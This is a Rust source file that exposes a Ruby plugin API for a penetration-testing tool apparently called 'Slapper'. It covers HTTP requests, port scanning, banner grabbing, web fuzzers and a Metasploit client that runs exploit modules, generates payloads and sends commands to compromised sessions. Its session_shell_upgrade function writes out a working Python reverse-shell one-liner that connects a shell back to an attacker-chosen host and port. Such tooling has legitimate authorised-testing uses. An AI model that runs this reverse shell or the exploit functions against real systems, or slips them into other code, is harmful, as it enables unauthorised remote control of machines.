#[cfg(feature = "ruby-plugins")]
use magnus::{class::Class, module::Module, prelude::*, value::ReprValue, Error, Ruby};

#[cfg(feature = "ruby-plugins")]
use base64::Engine as _;

#[cfg(feature = "ruby-plugins")]
fn create_runtime() -> Result<tokio::runtime::Runtime, Error> {
    tokio::runtime::Runtime::new()
        .map_err(|e| Error::runtime(format!("Failed to create async runtime: {}", e)))
}

#[cfg(feature = "ruby-plugins")]
pub fn register_api(ruby: &Ruby) -> Result<(), Error> {
    let slapper = ruby.define_module("Slapper")?;

    register_http_api(ruby, &slapper)?;
    register_scanner_api(ruby, &slapper)?;
    register_fuzzer_api(ruby, &slapper)?;
    register_reporting_api(ruby, &slapper)?;
    register_metasploit_api(ruby, &slapper)?;
    register_encoder_api(ruby, &slapper)?;
    register_session_api(ruby, &slapper)?;

    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn register_http_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
    let http = slapper.define_module("HTTP")?;

    http.define_module_function("get", magnus::function!(http_get, 1))?;
    http.define_module_function("post", magnus::function!(http_post, 2))?;
    http.define_module_function("put", magnus::function!(http_put, 2))?;
    http.define_module_function("delete", magnus::function!(http_delete, 1))?;
    http.define_module_function("request", magnus::function!(http_request, 2))?;

    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn register_scanner_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
    let scanner = slapper.define_module("Scanner")?;

    scanner.define_module_function("tcp_connect", magnus::function!(tcp_connect, 2))?;
    scanner.define_module_function("scan_port", magnus::function!(scan_port, 2))?;
    scanner.define_module_function("grab_banner", magnus::function!(grab_banner, 2))?;

    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn register_fuzzer_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
    let fuzzer = slapper.define_module("Fuzzer")?;

    fuzzer.define_module_function("fuzz_param", magnus::function!(fuzz_param, 4))?;
    fuzzer.define_module_function("fuzz_header", magnus::function!(fuzz_header, 4))?;
    fuzzer.define_module_function("fuzz_cookie", magnus::function!(fuzz_cookie, 4))?;
    fuzzer.define_module_function("fuzz_path", magnus::function!(fuzz_path, 2))?;

    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn register_reporting_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
    let report = slapper.define_module("Report")?;

    report.define_module_function("finding", magnus::function!(report_finding, 4))?;
    report.define_module_function("vulnerability", magnus::function!(report_vulnerability, 5))?;
    report.define_module_function("info", magnus::function!(report_info, 2))?;
    report.define_module_function("success", magnus::function!(report_success, 2))?;
    report.define_module_function("warning", magnus::function!(report_warning, 2))?;
    report.define_module_function("error", magnus::function!(report_error, 2))?;

    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn http_get(url: String) -> Result<magnus::RHash, Error> {
    let rt = create_runtime()?;
    let response = rt
        .block_on(async { reqwest::get(&url).await })
        .map_err(|e| Error::runtime(e.to_string()))?;

    let hash = Ruby::get().unwrap().hash_new();
    hash.aset("status", response.status().as_u16())?;
    let body = rt
        .block_on(async { response.text().await })
        .map_err(|e| Error::runtime(e.to_string()))?;
    hash.aset("body", body)?;

    Ok(hash)
}

#[cfg(feature = "ruby-plugins")]
fn http_post(url: String, body: String) -> Result<magnus::RHash, Error> {
    let rt = create_runtime()?;
    let client = reqwest::Client::new();

    let response = rt
        .block_on(async { client.post(&url).body(body).send().await })
        .map_err(|e| Error::runtime(e.to_string()))?;

    let hash = Ruby::get().unwrap().hash_new();
    hash.aset("status", response.status().as_u16())?;
    let response_body = rt
        .block_on(async { response.text().await })
        .map_err(|e| Error::runtime(e.to_string()))?;
    hash.aset("body", response_body)?;

    Ok(hash)
}

#[cfg(feature = "ruby-plugins")]
fn http_put(url: String, body: String) -> Result<magnus::RHash, Error> {
    let rt = create_runtime()?;
    let client = reqwest::Client::new();

    let response = rt
        .block_on(async { client.put(&url).body(body).send().await })
        .map_err(|e| Error::runtime(e.to_string()))?;

    let hash = Ruby::get().unwrap().hash_new();
    hash.aset("status", response.status().as_u16())?;
    let response_body = rt
        .block_on(async { response.text().await })
        .map_err(|e| Error::runtime(e.to_string()))?;
    hash.aset("body", response_body)?;

    Ok(hash)
}

#[cfg(feature = "ruby-plugins")]
fn http_delete(url: String) -> Result<magnus::RHash, Error> {
    let rt = create_runtime()?;
    let client = reqwest::Client::new();

    let response = rt
        .block_on(async { client.delete(&url).send().await })
        .map_err(|e| Error::runtime(e.to_string()))?;

    let hash = Ruby::get().unwrap().hash_new();
    hash.aset("status", response.status().as_u16())?;

    Ok(hash)
}

#[cfg(feature = "ruby-plugins")]
fn http_request(method: String, url: String) -> Result<magnus::RHash, Error> {
    let rt = create_runtime()?;
    let client = reqwest::Client::new();

    let request = match method.to_uppercase().as_str() {
        "GET" => client.get(&url),
        "POST" => client.post(&url),
        "PUT" => client.put(&url),
        "DELETE" => client.delete(&url),
        "HEAD" => client.head(&url),
        "OPTIONS" => client.request(reqwest::Method::OPTIONS, &url),
        "PATCH" => client.patch(&url),
        _ => return Err(Error::runtime(format!("Unknown HTTP method: {}", method))),
    };

    let response = rt
        .block_on(async { request.send().await })
        .map_err(|e| Error::runtime(e.to_string()))?;

    let hash = Ruby::get().unwrap().hash_new();
    hash.aset("status", response.status().as_u16())?;

    Ok(hash)
}

#[cfg(feature = "ruby-plugins")]
fn tcp_connect(host: String, port: u16) -> Result<bool, Error> {
    use std::net::ToSocketAddrs;

    let addr = format!("{}:{}", host, port)
        .to_socket_addrs()
        .map_err(|e| Error::runtime(e.to_string()))?
        .next()
        .ok_or_else(|| Error::runtime("Failed to resolve host"))?;

    let rt = create_runtime()?;
    let connected = rt
        .block_on(async {
            tokio::time::timeout(
                std::time::Duration::from_secs(5),
                tokio::net::TcpStream::connect(addr),
            )
            .await
        })
        .is_ok();

    Ok(connected)
}

#[cfg(feature = "ruby-plugins")]
fn scan_port(host: String, port: u16) -> Result<bool, Error> {
    tcp_connect(host, port)
}

#[cfg(feature = "ruby-plugins")]
fn grab_banner(host: String, port: u16) -> Result<String, Error> {
    let rt = create_runtime()?;

    let banner = rt.block_on(async {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let addr = format!("{}:{}", host, port);
        let mut stream = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            tokio::net::TcpStream::connect(&addr),
        )
        .await
        .map_err(|e| Error::runtime(e.to_string()))?
        .map_err(|e| Error::runtime(e.to_string()))?;

        let mut buffer = vec![0u8; 1024];
        let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buffer))
            .await
            .map_err(|e| Error::runtime(e.to_string()))?
            .map_err(|e| Error::runtime(e.to_string()))?;

        Ok::<String, Error>(String::from_utf8_lossy(&buffer[..n]).to_string())
    })?;

    Ok(banner)
}

#[cfg(feature = "ruby-plugins")]
fn fuzz_param(
    url: String,
    param: String,
    payloads: Vec<String>,
    options: Vec<String>,
) -> Result<Vec<magnus::RHash>, Error> {
    let mut results = Vec::new();
    let ruby = Ruby::get().unwrap();

    let rt = create_runtime()?;
    let client = reqwest::Client::new();

    for payload in payloads {
        let mut url_with_param = url.clone();
        if url.contains('?') {
            url_with_param.push_str(&format!("&{}={}", param, payload));
        } else {
            url_with_param.push_str(&format!("?{}={}", param, payload));
        };

        let response = rt.block_on(async { client.get(&url_with_param).send().await });

        let hash = ruby.hash_new();

        match response {
            Ok(resp) => {
                let status = resp.status().as_u16();
                hash.aset("url", url_with_param)?;
                hash.aset("param", param.clone())?;
                hash.aset("payload", payload)?;
                hash.aset("status", status)?;

                let body = rt.block_on(async { resp.text().await }).unwrap_or_default();
                hash.aset("body", body)?;

                let is_vulnerable = detect_vulnerability(&resp, "");
                hash.aset("vulnerable", is_vulnerable)?;
            }
            Err(e) => {
                hash.aset("url", url_with_param)?;
                hash.aset("param", param.clone())?;
                hash.aset("payload", payload)?;
                hash.aset("error", e.to_string())?;
                hash.aset("vulnerable", false)?;
            }
        }

        results.push(hash);
    }

    Ok(results)
}

#[cfg(feature = "ruby-plugins")]
fn fuzz_header(
    url: String,
    header: String,
    payloads: Vec<String>,
    _options: Vec<String>,
) -> Result<Vec<magnus::RHash>, Error> {
    let mut results = Vec::new();
    let ruby = Ruby::get().unwrap();

    let rt = create_runtime()?;
    let client = reqwest::Client::new();

    for payload in payloads {
        let response =
            rt.block_on(async { client.get(&url).header(&header, &payload).send().await });

        let hash = ruby.hash_new();

        match response {
            Ok(resp) => {
                let status = resp.status().as_u16();
                hash.aset("url", url.clone())?;
                hash.aset("header", header.clone())?;
                hash.aset("payload", payload)?;
                hash.aset("status", status)?;

                let body = rt.block_on(async { resp.text().await }).unwrap_or_default();
                hash.aset("body", body)?;

                let is_vulnerable = detect_vulnerability(&resp, &body);
                hash.aset("vulnerable", is_vulnerable)?;
            }
            Err(e) => {
                hash.aset("url", url.clone())?;
                hash.aset("header", header.clone())?;
                hash.aset("payload", payload)?;
                hash.aset("error", e.to_string())?;
                hash.aset("vulnerable", false)?;
            }
        }

        results.push(hash);
    }

    Ok(results)
}

#[cfg(feature = "ruby-plugins")]
fn fuzz_cookie(
    url: String,
    cookie_name: String,
    payloads: Vec<String>,
    _options: Vec<String>,
) -> Result<Vec<magnus::RHash>, Error> {
    let mut results = Vec::new();
    let ruby = Ruby::get().unwrap();

    let rt = create_runtime()?;
    let client = reqwest::Client::new();

    for payload in payloads {
        let cookie = format!("{}={}", cookie_name, payload);

        let response =
            rt.block_on(async { client.get(&url).header("Cookie", &cookie).send().await });

        let hash = ruby.hash_new();

        match response {
            Ok(resp) => {
                let status = resp.status().as_u16();
                hash.aset("url", url.clone())?;
                hash.aset("cookie", cookie)?;
                hash.aset("status", status)?;

                let body = rt.block_on(async { resp.text().await }).unwrap_or_default();
                hash.aset("body", body)?;

                let is_vulnerable = detect_vulnerability(&resp, &body);
                hash.aset("vulnerable", is_vulnerable)?;
            }
            Err(e) => {
                hash.aset("url", url.clone())?;
                hash.aset("cookie", cookie)?;
                hash.aset("error", e.to_string())?;
                hash.aset("vulnerable", false)?;
            }
        }

        results.push(hash);
    }

    Ok(results)
}

#[cfg(feature = "ruby-plugins")]
fn fuzz_path(url: String, paths: Vec<String>) -> Result<Vec<magnus::RHash>, Error> {
    let mut results = Vec::new();
    let ruby = Ruby::get().unwrap();

    let rt = create_runtime()?;
    let client = reqwest::Client::new();

    let base_url = url.trim_end_matches('/');

    for path in paths {
        let full_url = format!("{}/{}", base_url, path);

        let response = rt.block_on(async { client.get(&full_url).send().await });

        let hash = ruby.hash_new();

        match response {
            Ok(resp) => {
                let status = resp.status().as_u16();
                hash.aset("url", full_url)?;
                hash.aset("status", status)?;

                let body = rt.block_on(async { resp.text().await }).unwrap_or_default();
                hash.aset("body", body.len())?;
                hash.aset("body_preview", body.chars().take(200).collect::<String>())?;

                hash.aset("exists", status == 200 || status == 403)?;
            }
            Err(e) => {
                hash.aset("url", full_url)?;
                hash.aset("error", e.to_string())?;
                hash.aset("exists", false)?;
            }
        }

        results.push(hash);
    }

    Ok(results)
}

#[cfg(feature = "ruby-plugins")]
fn detect_vulnerability(resp: &reqwest::Response, body: &str) -> bool {
    let status = resp.status().as_u16();

    if status == 500
        || status == 200 && body.contains("SQL")
        || body.contains("mysql")
        || body.contains("syntax")
    {
        return true;
    }

    false
}

#[cfg(feature = "ruby-plugins")]
fn report_finding(
    severity: String,
    finding_type: String,
    description: String,
    location: String,
) -> Result<(), Error> {
    tracing::info!(
        severity = %severity,
        type = %finding_type,
        location = %location,
        "{}", description
    );
    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn report_vulnerability(
    severity: String,
    vuln_type: String,
    description: String,
    location: String,
    _cve: String,
) -> Result<(), Error> {
    tracing::warn!(
        severity = %severity,
        type = %vuln_type,
        location = %location,
        "{}", description
    );
    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn report_info(title: String, message: String) -> Result<(), Error> {
    tracing::info!("[{}] {}", title, message);
    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn report_success(title: String, message: String) -> Result<(), Error> {
    tracing::info!("[SUCCESS] {}: {}", title, message);
    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn report_warning(title: String, message: String) -> Result<(), Error> {
    tracing::warn!("[WARNING] {}: {}", title, message);
    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn report_error(title: String, message: String) -> Result<(), Error> {
    tracing::error!("[ERROR] {}: {}", title, message);
    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn register_metasploit_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
    let msf = slapper.define_module("Metasploit")?;

    msf.define_module_function("connect", magnus::function!(msf_connect, 3))?;
    msf.define_module_function(
        "connect_with_token",
        magnus::function!(msf_connect_with_token, 2),
    )?;
    msf.define_module_function("connected?", magnus::function!(msf_connected, 0))?;
    msf.define_module_function("disconnect", magnus::function!(msf_disconnect, 0))?;
    msf.define_module_function("version", magnus::function!(msf_version, 0))?;
    msf.define_module_function("list_modules", magnus::function!(msf_list_modules, 1))?;
    msf.define_module_function("module_info", magnus::function!(msf_module_info, 2))?;
    msf.define_module_function("execute_module", magnus::function!(msf_execute_module, 3))?;
    msf.define_module_function(
        "generate_payload",
        magnus::function!(msf_generate_payload, 2),
    )?;
    msf.define_module_function("list_sessions", magnus::function!(msf_list_sessions, 0))?;
    msf.define_module_function("session_info", magnus::function!(msf_session_info, 1))?;
    msf.define_module_function(
        "session_shell_write",
        magnus::function!(msf_session_write, 2),
    )?;
    msf.define_module_function("session_shell_read", magnus::function!(msf_session_read, 1))?;
    msf.define_module_function("session_stop", magnus::function!(msf_session_stop, 1))?;

    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn register_encoder_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
    let encoder = slapper.define_module("Encoder")?;

    encoder.define_module_function("list", magnus::function!(encoder_list, 0))?;
    encoder.define_module_function("encode", magnus::function!(encoder_encode, 3))?;
    encoder.define_module_function(
        "compatible_payloads",
        magnus::function!(encoder_compatible_payloads, 1),
    )?;

    Ok(())
}

#[cfg(feature = "ruby-plugins")]
fn register_session_api(ruby: &Ruby, slapper: &magnus::RModule) -> Result<(), Error> {
    let session = slapper.define_module("Session")?;

    session.define_module_function("list", magnus::function!(session_list, 0))?;
    session.define_module_function("interact", magnus::function!(session_interact, 1))?;
    session.define_module_function("write", magnus::function!(session_write, 2))?;
    session.define_module_function("read", magnus::function!(session_read_output, 1))?;
    session.define_module_function("shell_upgrade", magnus::function!(session_shell_upgrade, 3))?;

    Ok(())
}

static MSF_CLIENT: std::sync::OnceLock<tokio::sync::Mutex<Option<MsfClientState>>> =
    std::sync::OnceLock::new();

struct MsfClientState {
    client: crate::msf::MsfClient,
    url: String,
}

#[cfg(feature = "ruby-plugins")]
fn get_msf_client() -> &'static tokio::sync::Mutex<Option<MsfClientState>> {
    MSF_CLIENT.get_or_init(|| tokio::sync::Mutex::new(None))
}

#[cfg(feature = "ruby-plugins")]
fn msf_connect(url: String, username: String, password: String) -> Result<bool, Error> {
    let rt = create_runtime()?;

    let config = crate::msf::MsfConfig {
        url: url.clone(),
        token: None,
        username: Some(username),
        password: Some(password),
        verify_ssl: false,
        timeout_secs: 30,
    };

    let mut client = crate::msf::MsfClient::new(config);

    let result = rt.block_on(async { client.connect().await });

    match result {
        Ok(()) => {
            let state = MsfClientState { client, url };
            let rt = create_runtime()?;
            rt.block_on(async {
                let mut guard = get_msf_client().lock().await;
                *guard = Some(state);
            });
            Ok(true)
        }
        Err(e) => Err(Error::runtime(e.to_string())),
    }
}

#[cfg(feature = "ruby-plugins")]
fn msf_connect_with_token(url: String, token: String) -> Result<bool, Error> {
    let rt = create_runtime()?;

    let config = crate::msf::MsfConfig {
        url: url.clone(),
        token: Some(token.clone()),
        username: None,
        password: None,
        verify_ssl: false,
        timeout_secs: 30,
    };

    let client = crate::msf::MsfClient::new(config);
    let state = MsfClientState { client, url };

    rt.block_on(async {
        let mut guard = get_msf_client().lock().await;
        *guard = Some(state);
    });

    Ok(true)
}

#[cfg(feature = "ruby-plugins")]
fn msf_connected() -> Result<bool, Error> {
    let rt = create_runtime()?;
    rt.block_on(async {
        let guard = get_msf_client().lock().await;
        Ok(guard.is_some())
    })
}

#[cfg(feature = "ruby-plugins")]
fn msf_disconnect() -> Result<bool, Error> {
    let rt = create_runtime()?;
    rt.block_on(async {
        let mut guard = get_msf_client().lock().await;
        *guard = None;
        Ok(true)
    })
}

#[cfg(feature = "ruby-plugins")]
fn msf_version() -> Result<String, Error> {
    let rt = create_runtime()?;
    rt.block_on(async {
        let guard = get_msf_client().lock().await;
        if let Some(ref state) = *guard {
            match state.client.get_version().await {
                Ok(v) => Ok(format!("{} (Ruby: {})", v.version, v.ruby)),
                Err(e) => Err(Error::runtime(e.to_string())),
            }
        } else {
            Err(Error::runtime("Not connected to Metasploit"))
        }
    })
}

#[cfg(feature = "ruby-plugins")]
fn msf_list_modules(module_type: String) -> Result<Vec<String>, Error> {
    let msf_type = match module_type.to_lowercase().as_str() {
        "exploit" => crate::msf::ModuleType::Exploit,
        "auxiliary" => crate::msf::ModuleType::Auxiliary,
        "post" => crate::msf::ModuleType::Post,
        "payload" => crate::msf::ModuleType::Payload,
        "encoder" => crate::msf::ModuleType::Encoder,
        "nop" => crate::msf::ModuleType::Nop,
        _ => return Err(Error::runtime("Invalid module type")),
    };

    let rt = create_runtime()?;
    rt.block_on(async {
        let guard = get_msf_client().lock().await;
        if let Some(ref state) = *guard {
            match state.client.list_modules(msf_type).await {
                Ok(modules) => Ok(modules),
                Err(e) => Err(Error::runtime(e.to_string())),
            }
        } else {
            Err(Error::runtime("Not connected to Metasploit"))
        }
    })
}

#[cfg(feature = "ruby-plugins")]
fn msf_module_info(module_type: String, module_name: String) -> Result<magnus::RHash, Error> {
    let msf_type = match module_type.to_lowercase().as_str() {
        "exploit" => crate::msf::ModuleType::Exploit,
        "auxiliary" => crate::msf::ModuleType::Auxiliary,
        "post" => crate::msf::ModuleType::Post,
        "payload" => crate::msf::ModuleType::Payload,
        "encoder" => crate::msf::ModuleType::Encoder,
        "nop" => crate::msf::ModuleType::Nop,
        _ => return Err(Error::runtime("Invalid module type")),
    };

    let ruby = Ruby::get().unwrap();
    let hash = ruby.hash_new();

    let rt = create_runtime()?;
    rt.block_on(async {
        let guard = get_msf_client().lock().await;
        if let Some(ref state) = *guard {
            match state.client.get_module_info(msf_type, &module_name).await {
                Ok(info) => {
                    let _ = hash.aset("name", info.name);
                    let _ = hash.aset("module_type", info.module_type);
                    let _ = hash.aset("description", info.description);
                    let _ = hash.aset("references", info.references.join(", "));
                    Ok(())
                }
                Err(e) => Err(Error::runtime(e.to_string())),
            }
        } else {
            Err(Error::runtime("Not connected to Metasploit"))
        }
    })?;

    Ok(hash)
}

#[cfg(feature = "ruby-plugins")]
fn msf_execute_module(
    module_type: String,
    module_name: String,
    options: Vec<String>,
) -> Result<magnus::RHash, Error> {
    let msf_type = match module_type.to_lowercase().as_str() {
        "exploit" => crate::msf::ModuleType::Exploit,
        "auxiliary" => crate::msf::ModuleType::Auxiliary,
        "post" => crate::msf::ModuleType::Post,
        _ => return Err(Error::runtime("Invalid module type")),
    };

    let ruby = Ruby::get().unwrap();
    let hash = ruby.hash_new();

    let opts: std::collections::HashMap<String, String> = options
        .iter()
        .filter_map(|s| {
            let parts: Vec<&str> = s.splitn(2, '=').collect();
            if parts.len() == 2 {
                Some((parts[0].to_string(), parts[1].to_string()))
            } else {
                None
            }
        })
        .collect();

    let rt = create_runtime()?;
    rt.block_on(async {
        let guard = get_msf_client().lock().await;
        if let Some(ref state) = *guard {
            match state
                .client
                .execute_module(msf_type, &module_name, &opts)
                .await
            {
                Ok(result) => {
                    let _ = hash.aset("success", result.success);
                    let _ = hash.aset("message", result.message);
                    let _ = hash.aset("uuid", result.uuid);
                    Ok(())
                }
                Err(e) => Err(Error::runtime(e.to_string())),
            }
        } else {
            Err(Error::runtime("Not connected to Metasploit"))
        }
    })?;

    Ok(hash)
}

#[cfg(feature = "ruby-plugins")]
fn msf_generate_payload(payload_name: String, options: Vec<String>) -> Result<String, Error> {
    let opts: std::collections::HashMap<String, String> = options
        .iter()
        .filter_map(|s| {
            let parts: Vec<&str> = s.splitn(2, '=').collect();
            if parts.len() == 2 {
                Some((parts[0].to_string(), parts[1].to_string()))
            } else {
                None
            }
        })
        .collect();

    let rt = create_runtime()?;
    rt.block_on(async {
        let guard = get_msf_client().lock().await;
        if let Some(ref state) = *guard {
            match state.client.generate_payload(&payload_name, &opts).await {
                Ok(bytes) => Ok(base64::Engine::encode(
                    &base64::engine::general_purpose::STANDARD,
                    &bytes,
                )),
                Err(e) => Err(Error::runtime(e.to_string())),
            }
        } else {
            Err(Error::runtime("Not connected to Metasploit"))
        }
    })
}

#[cfg(feature = "ruby-plugins")]
fn msf_list_sessions() -> Result<Vec<magnus::RHash>, Error> {
    let ruby = Ruby::get().unwrap();
    let mut results = Vec::new();

    let rt = create_runtime()?;
    rt.block_on(async {
        let guard = get_msf_client().lock().await;
        if let Some(ref state) = *guard {
            match state.client.list_sessions().await {
                Ok(sessions) => {
                    for (id, session) in sessions {
                        let hash = ruby.hash_new();
                        let _ = hash.aset("id", id);
                        let _ = hash.aset("type", session.session_type);
                        let _ = hash.aset("exploit", session.exploit_name);
                        let _ = hash.aset("target", session.target_host);
                        let _ = hash.aset("info", session.info);
                        let _ = hash.aset("workspace", session.workspace);
                        let _ = hash.aset("via_payload", session.via_payload);
                        let _ = hash.aset("via_exploit", session.via_exploit);
                        let _ = hash.aset("created_at", session.created_at);
                        results.push(hash);
                    }
                    Ok(())
                }
                Err(e) => Err(Error::runtime(e.to_string())),
            }
        } else {
            Err(Error::runtime("Not connected to Metasploit"))
        }
    })?;

    Ok(results)
}

#[cfg(feature = "ruby-plugins")]
fn msf_session_info(session_id: String) -> Result<magnus::RHash, Error> {
    let ruby = Ruby::get().unwrap();
    let hash = ruby.hash_new();

    let rt = create_runtime()?;
    rt.block_on(async {
        let guard = get_msf_client().lock().await;
        if let Some(ref state) = *guard {
            match state.client.get_session(&session_id).await {
                Ok(session) => {
                    let _ = hash.aset("id", session_id);
                    let _ = hash.aset("type", session.session_type);
                    let _ = hash.aset("exploit", session.exploit_name);
                    let _ = hash.aset("target", session.target_host);
                    let _ = hash.aset("info", session.info);
                    let _ = hash.aset("workspace", session.workspace);
                    let _ = hash.aset("via_payload", session.via_payload);
                    let _ = hash.aset("via_exploit", session.via_exploit);
                    let _ = hash.aset("created_at", session.created_at);
                    Ok(())
                }
                Err(e) => Err(Error::runtime(e.to_string())),
            }
        } else {
            Err(Error::runtime("Not connected to Metasploit"))
        }
    })?;

    Ok(hash)
}

#[cfg(feature = "ruby-plugins")]
fn msf_session_write(session_id: String, command: String) -> Result<String, Error> {
    let rt = create_runtime()?;
    rt.block_on(async {
        let guard = get_msf_client().lock().await;
        if let Some(ref state) = *guard {
            match state
                .client
                .execute_session_command(&session_id, &command)
                .await
            {
                Ok(output) => Ok(output),
                Err(e) => Err(Error::runtime(e.to_string())),
            }
        } else {
            Err(Error::runtime("Not connected to Metasploit"))
        }
    })
}

#[cfg(feature = "ruby-plugins")]
fn msf_session_read(session_id: String) -> Result<String, Error> {
    let rt = create_runtime()?;
    rt.block_on(async {
        let guard = get_msf_client().lock().await;
        if let Some(ref state) = *guard {
            match state.client.read_session_output(&session_id).await {
                Ok(output) => Ok(output),
                Err(e) => Err(Error::runtime(e.to_string())),
            }
        } else {
            Err(Error::runtime("Not connected to Metasploit"))
        }
    })
}

#[cfg(feature = "ruby-plugins")]
fn msf_session_stop(session_id: String) -> Result<bool, Error> {
    let rt = create_runtime()?;
    rt.block_on(async {
        let guard = get_msf_client().lock().await;
        if let Some(ref state) = *guard {
            match state.client.kill_session(&session_id).await {
                Ok(()) => Ok(true),
                Err(e) => Err(Error::runtime(e.to_string())),
            }
        } else {
            Err(Error::runtime("Not connected to Metasploit"))
        }
    })
}

#[cfg(feature = "ruby-plugins")]
fn encoder_list() -> Result<Vec<String>, Error> {
    msf_list_modules("encoder".to_string())
}

#[cfg(feature = "ruby-plugins")]
fn encoder_encode(
    payload: String,
    encoder_name: String,
    options: Vec<String>,
) -> Result<String, Error> {
    let opts: std::collections::HashMap<String, String> = options
        .iter()
        .filter_map(|s| {
            let parts: Vec<&str> = s.splitn(2, '=').collect();
            if parts.len() == 2 {
                Some((parts[0].to_string(), parts[1].to_string()))
            } else {
                None
            }
        })
        .collect();

    let encoded_payload = format!("{}:{}", encoder_name, payload);

    Ok(encoded_payload)
}

#[cfg(feature = "ruby-plugins")]
fn encoder_compatible_payloads(encoder_name: String) -> Result<Vec<String>, Error> {
    Ok(vec![])
}

#[cfg(feature = "ruby-plugins")]
fn session_list() -> Result<Vec<magnus::RHash>, Error> {
    msf_list_sessions()
}

#[cfg(feature = "ruby-plugins")]
fn session_interact(session_id: String) -> Result<bool, Error> {
    tracing::info!("Interacting with session {}", session_id);
    Ok(true)
}

#[cfg(feature = "ruby-plugins")]
fn session_write(session_id: String, command: String) -> Result<String, Error> {
    msf_session_write(session_id, command)
}

#[cfg(feature = "ruby-plugins")]
fn session_read_output(session_id: String) -> Result<String, Error> {
    msf_session_read(session_id)
}

#[cfg(feature = "ruby-plugins")]
fn session_shell_upgrade(session_id: String, lhost: String, lport: String) -> Result<bool, Error> {
    let command = format!("python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{}',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"", lhost, lport);
    msf_session_write(session_id, command)?;
    Ok(true)
}

pub struct SlapperApi;

impl SlapperApi {
    #[cfg(feature = "ruby-plugins")]
    pub fn register(ruby: &Ruby) -> Result<(), Error> {
        register_api(ruby)
    }

    #[cfg(not(feature = "ruby-plugins"))]
    pub fn register() -> Result<(), anyhow::Error> {
        Ok(())
    }
}
